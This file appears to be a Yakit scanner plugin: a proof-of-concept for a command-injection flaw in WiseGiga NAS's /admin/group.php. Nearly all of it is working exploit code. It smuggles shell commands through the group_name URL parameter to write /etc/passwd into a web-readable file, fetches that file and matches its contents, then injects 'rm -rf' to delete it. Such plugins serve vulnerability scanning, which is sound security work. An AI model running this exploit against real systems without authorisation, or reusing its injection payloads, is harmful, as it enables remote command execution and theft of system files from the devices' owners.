yakit.AutoInitYakit()

handleCheck = func(target,port){
    var url
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)
    level=["","low","middle","high","critical"]
    if isTls {
        url="https://"+addr
    }else{
        url="http://"+addr
    }
    vulnable=false

    reference="wisegiga nas group php rce 漏洞"
    severity=level[4]
    type="命令执行"
    fileName = str.RandStr(5)

    poc_url_r0= url + `/admin/group.php?memberid=root&cmd=add&group_name=d;cat%20/etc/passwd>`+ parseStr(fileName) +`.txt`
    req_r0, _ := http.NewRequest("GET",poc_url_r0,http.noredirect(),
    http.header("Content-Type", `application/x-www-form-urlencoded`),)
    breq,_=http.dump(req_r0)
    resp_r0, err := http.Do(req_r0)
    die(err)
    bresp,_=http.dump(resp_r0)
    header, body = poc.Split(bresp)
    r0_flag = false
    if resp_r0.StatusCode == 200 && re.Match(`window.open[(]\"menu02_02_m.php\",\"_self\"[)];`,string(body)){
        r0_flag = true
    }

    poc_url_r1= url + `/admin/`+ parseStr(fileName) +`.txt`
    req_r1, _ := http.NewRequest("GET",poc_url_r1,http.noredirect(),
    http.header("Content-Type", `application/x-www-form-urlencoded`),)
    breq,_=http.dump(req_r1)
    resp_r1, err := http.Do(req_r1)
    die(err)
    bresp,_=http.dump(resp_r1)
    header, body = poc.Split(bresp)
    r1_flag = false
    if resp_r1.StatusCode == 200 && re.Match(`root:.*?:[0-9]*:[0-9]*:`,string(body)){
        r1_flag = true
    }

    poc_url_r2= url + `/admin/group.php?memberid=root&cmd=add&group_name=d;rm%20-rf%20`+ parseStr(fileName) +`.txt`
    req_r2, _ := http.NewRequest("GET",poc_url_r2,http.noredirect(),
    http.header("Content-Type", `application/x-www-form-urlencoded`),)
    breq,_=http.dump(req_r2)
    resp_r2, err := http.Do(req_r2)
    die(err)
    bresp,_=http.dump(resp_r2)
    header, body = poc.Split(bresp)
    r2_flag = false
    if resp_r2.StatusCode == 200 && re.Match(`window.open[(]\"menu02_02_m.php\",\"_self\"[)];`,string(body)){
        r2_flag = true
    }

    poc_url=poc_url_r2
    if r0_flag && r1_flag && r2_flag{
        vulnable = true
    }
    if vulnable {
            yakit.Info("FOUND INFO for %v %v",reference,type)
            risk.NewRisk(
                url, risk.severity(severity), 
                risk.title(sprintf("FOUND %v %v",reference,type)),
                risk.titleVerbose(sprintf("%v %v",reference,type)),
                risk.type(type), risk.typeVerbose(type),
                risk.details({
                    "request": breq,
                    "response": bresp,
                    "url": poc_url,
                }),
            )
        }
    return
}
handle = func(result) {
    if !result.IsOpen(){
        return
    }
    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
}
